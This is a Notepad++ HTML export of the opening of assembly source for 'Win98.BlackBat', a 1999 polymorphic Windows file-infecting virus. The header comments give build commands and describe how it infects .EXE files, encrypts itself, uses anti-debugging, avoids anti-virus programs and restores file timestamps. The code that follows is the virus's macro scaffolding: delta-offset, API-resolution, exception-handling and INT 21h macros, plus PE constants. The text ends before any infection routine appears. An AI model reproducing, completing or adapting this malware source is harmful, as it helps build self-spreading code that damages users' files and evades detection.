<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |        \|/                           Win98.BlackBat                    | |</span><span class="sc0">
</span><span class="sc1">;| |       (. .)                         ================                   | |</span><span class="sc0">
</span><span class="sc1">;| |       ( | )                                                            | |</span><span class="sc0">
</span><span class="sc1">;| |       ( v )                  (c) 1999, Rohitab Batra                   | |</span><span class="sc0">
</span><span class="sc1">;| |      __| |__                  &lt;sourcecode@rohitab.com&gt;                 | |</span><span class="sc0">
</span><span class="sc1">;| |    //               \\                ICQ: 11153794                    | |</span><span class="sc0">
</span><span class="sc1">;| |   //                 ^                                                 | |</span><span class="sc0">
</span><span class="sc1">;| |   ((====&gt;                    http://www.rohitab.com                    | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |            Discussion Forum: http://www.rohitab.com/discuss/           | |</span><span class="sc0">
</span><span class="sc1">;| |            Mailing List: http://www.rohitab.com/mlist/                 | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |"Blessed is he who expects nothing, for he shall not be disappointed"   | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Compiling (Turbo Assembler)</span><span class="sc0">
</span><span class="sc1">;   c:\&gt;tasm32 /ml /m3 /t /w2 /s /p /dDEBUG=1 BlackBat</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Setting DEBUG=0 will compile the virus in Release mode. In this mode, an error</span><span class="sc0">
</span><span class="sc1">;message will be displayed, so that you don't accidently compile in release mode.</span><span class="sc0">
</span><span class="sc1">;In Release mode, the size of the Virus will be smaller, and .EXE files will be</span><span class="sc0">
</span><span class="sc1">;infected, instead of .XYZ files. In Debug mode, the file NOTEPAD.EXE, if found</span><span class="sc0">
</span><span class="sc1">;in the current directory, will be infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Linking (Turbo Linker)</span><span class="sc0">
</span><span class="sc1">;   c:\&gt;tlink32 /x /Tpe /aa /c BlackBat,BlackBat,,IMPORT32.LIB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Making Code Section Writable (EditBin from SDK, or any other utility)</span><span class="sc0">
</span><span class="sc1">;   c:\&gt;editbin /SECTION:CODE,w BlackBat.EXE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;***** Info About the Virus *****</span><span class="sc0">
</span><span class="sc1">;* If WIN.SYS is found in the root directory, the virus does not infect any file,</span><span class="sc0">
</span><span class="sc1">;  and does not become resident.</span><span class="sc0">
</span><span class="sc1">;* File time and attributes are restored after infection</span><span class="sc0">
</span><span class="sc1">;* Encrypted with a random key</span><span class="sc0">
</span><span class="sc1">;* Doesn't infect anti-virus files, NAV, TBAV, SCAN, CLEAN, F-PROT</span><span class="sc0">
</span><span class="sc1">;* Anti-Debugging Code</span><span class="sc0">
</span><span class="sc1">;* Structured Exception Handling</span><span class="sc0">
</span><span class="sc1">;* Decryption engine is Polymorphic</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;***** TODO *****</span><span class="sc0">
</span><span class="sc1">;1. Dont infect files with todays date</span><span class="sc0">
</span><span class="sc1">;2. Draw Random Bats on the Screen (Use CreateCompatibleBitmap &amp; Get/Set Pixel)</span><span class="sc0">
</span><span class="sc1">;3. Doesn't infect files in directories with long file names</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">            </span><span class="sc1">;Any Imported Fn, so that the first</span><span class="sc0">
                                    </span><span class="sc1">;generation copy executes without crashing</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                        </span><span class="sc1">;Required for TASM, Else will Crash !!??</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        @MESSAGE_BOX Macro                              | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Displays a MessageBox with the given Message. Note the caption of</span><span class="sc0">
</span><span class="sc1">;      the MessageBox is the same as the Message</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; szMessage: Message to be displayed</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; ALL</span><span class="sc0">
</span><span class="sc1">;___________________________</span><span class="sc0">
</span><span class="sc5">@MESSAGE_BOX</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">szMessage</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMessage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MB_OK</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        @DEFINE_API Macro                               | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Defines an API that will be called by the Virus. The macro is expanded</span><span class="sc0">
</span><span class="sc1">;      to the following, if APIName is MessageBoxA:</span><span class="sc0">
</span><span class="sc1">;      szMessageBoxA DB "MessageBoxA", 0</span><span class="sc0">
</span><span class="sc1">;      MessageBoxA   DD ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; APIName: API to be defined. MUST BE EXACTLY the same as exported by</span><span class="sc0">
</span><span class="sc1">;               the DLL. e.g. MessageBoxA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;________________________</span><span class="sc0">
</span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">APIName</span><span class="sc0">
    </span><span class="sc5">sz</span><span class="sc4">&amp;</span><span class="sc5">APIName</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"&amp;APIName"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;;ASCIIZ Name of API</span><span class="sc0">
    </span><span class="sc4">&amp;</span><span class="sc5">APIName</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;;Storage space for API Address</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            @DELTA Macro                                | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Returns the delta offset in the specified register</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; Register: register in which the value of the delta offset is copied</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; Register: Delta Offset</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; Register</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;____________________</span><span class="sc0">
</span><span class="sc5">@DELTA</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">Register</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">GetIP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIP</span><span class="sc0">                               </span><span class="sc1">;;This will push EIP on the stack</span><span class="sc0">
</span><span class="sc5">GetIP</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">Register</span><span class="sc0">                            </span><span class="sc1">;;get EIP of current instruction</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">Register</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetIP</span><span class="sc0">              </span><span class="sc1">;;Delta Offset</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                          @OFFSET Macro                                 | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Returns the true offset of the specified address. Unlike the offset</span><span class="sc0">
</span><span class="sc1">;      keyword, which calculates the address at assembly time, this macro</span><span class="sc0">
</span><span class="sc1">;      calculates the address at run-time. This is used to get the correct</span><span class="sc0">
</span><span class="sc1">;      offset when the virus has been relocated. Instead of using instructions</span><span class="sc0">
</span><span class="sc1">;      like "mov esi, offset szFilename", use "@OFFSET esi, szFilename"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; Register: register in which the offset is to be returned</span><span class="sc0">
</span><span class="sc1">;   -&gt; Expression: expression whose offset is required</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; Register: Correct offset of Expression</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; Register</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;_________________________________</span><span class="sc0">
</span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">Register</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Expression</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">GetIP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIP</span><span class="sc0">                                   </span><span class="sc1">;;This will push EIP on the stack</span><span class="sc0">
</span><span class="sc5">GetIP</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">Register</span><span class="sc0">                                </span><span class="sc1">;;get EIP of current instruction</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">Register</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Expression</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetIP</span><span class="sc0">  </span><span class="sc1">;;True offset</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        @GET_API_ADDRESS Macro                          | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Gets the address of the API, and stores it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; APIName:     API whose address is required</span><span class="sc0">
</span><span class="sc1">;   -&gt; ESI:         Delta Offset</span><span class="sc0">
</span><span class="sc1">;   -&gt; EBX:         Address of GetProcAddress(...)</span><span class="sc0">
</span><span class="sc1">;   -&gt; ECX:         Base address of DLL which exports the API</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All Except ESI, EBX and ECX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;_____________________________</span><span class="sc0">
</span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">APIName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;;Save Addr of GetProcAddress(...)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;;Save Image Base</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sz</span><span class="sc4">&amp;</span><span class="sc5">APIName</span><span class="sc0">          </span><span class="sc1">;;API whose address is required</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;;GetProcAddress(...)</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;;Restore Image Base</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;;Restore Addr of GetProcAddress(...)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">APIName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;;Save API Address</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |    @TRY_BEGIN, @TRY_EXCEPT and @TRY_END Exception Handling Macros      | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; @TRY_BEGIN: This macro is used to install the exception handler. The</span><span class="sc0">
</span><span class="sc1">;                  code that follows this is the one that is checked for</span><span class="sc0">
</span><span class="sc1">;                  exceptions</span><span class="sc0">
</span><span class="sc1">;      @TRY_EXCEPT: The code that follows this is executed if an exception</span><span class="sc0">
</span><span class="sc1">;                   occurs.</span><span class="sc0">
</span><span class="sc1">;      @TRY_END: This is used to mark the end of the TRY block</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Example</span><span class="sc0">
</span><span class="sc1">;       @TRY_BEGIN ZeroMemory</span><span class="sc0">
</span><span class="sc1">;           &lt;CODE1: Code to check for exceptions goes here&gt;</span><span class="sc0">
</span><span class="sc1">;       @TRY_CATCH ZeroMemory</span><span class="sc0">
</span><span class="sc1">;           &lt;CODE2: Gets executed if an exception occurs in CODE1&gt;</span><span class="sc0">
</span><span class="sc1">;       @TRY_END ZeroMemory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; Handler: Name of the exception handler. MUST BE UNIQUE throughout the</span><span class="sc0">
</span><span class="sc1">;               program</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; If an exception occurs, all registers are restored to the state before</span><span class="sc0">
</span><span class="sc1">;      the @TRY_BEGIN block, otherwise, no registers are modified</span><span class="sc0">
</span><span class="sc1">;_______________________</span><span class="sc0">
</span><span class="sc5">@TRY_BEGIN</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">Handler</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                              </span><span class="sc1">;;Save Current State</span><span class="sc0">
    </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Handler</span><span class="sc0">                </span><span class="sc1">;;Address of New Exception Handler</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;;Save Old Exception Handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">       </span><span class="sc1">;;Install New Handler</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">@TRY_EXCEPT</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">Handler</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NoException</span><span class="sc4">&amp;</span><span class="sc5">Handler</span><span class="sc0">         </span><span class="sc1">;;No Exception Occured, so jump over</span><span class="sc0">
</span><span class="sc5">Handler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;;Exception Occured, Get old ESP</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;;Restore Old Exception Handler</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">;;ESP value before SEH was set</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                               </span><span class="sc1">;;Restore Old State</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">@TRY_END</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">Handler</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExceptionHandled</span><span class="sc4">&amp;</span><span class="sc5">Handler</span><span class="sc0">    </span><span class="sc1">;;Exception was handled by @TRY_EXCEPT</span><span class="sc0">
</span><span class="sc5">NoException</span><span class="sc4">&amp;</span><span class="sc5">Handler</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;;No Exception Occured</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;;Restore Old Exception Handler</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                 </span><span class="sc1">;;ESP value before SEH was set. 32 for pushad and ...</span><span class="sc0">
                                        </span><span class="sc1">;;...4 for push offset Handler. (No Restore State)</span><span class="sc0">
</span><span class="sc5">ExceptionHandled</span><span class="sc4">&amp;</span><span class="sc5">Handler</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;;Exception has been handled, or no exception occured</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        @CALL_INT21h Macro                              | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Makes an INT 21h Call in Protected Mode</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; Service:     INT 21h Service Number</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; Depends on Service called</span><span class="sc0">
</span><span class="sc1">;_________________________</span><span class="sc0">
</span><span class="sc5">@CALL_INT21h</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">Service</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Service</span><span class="sc0">                </span><span class="sc1">;;INT 21h Service</span><span class="sc0">
    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VWIN32_Int21Dispatch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            Constants                                   | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;Win32 Constants</span><span class="sc0">
    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc5">IMAGE_READ_WRITE_EXECUTE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0E0000000h</span><span class="sc0">
    </span><span class="sc5">IMAGE_SCN_MEM_SHARED</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">10000000h</span><span class="sc0">   </span><span class="sc1">;Section is Sharable</span><span class="sc0">
    </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2000h</span><span class="sc0">       </span><span class="sc1">;File is a DLL</span><span class="sc0">
    </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000F001Fh</span><span class="sc0">
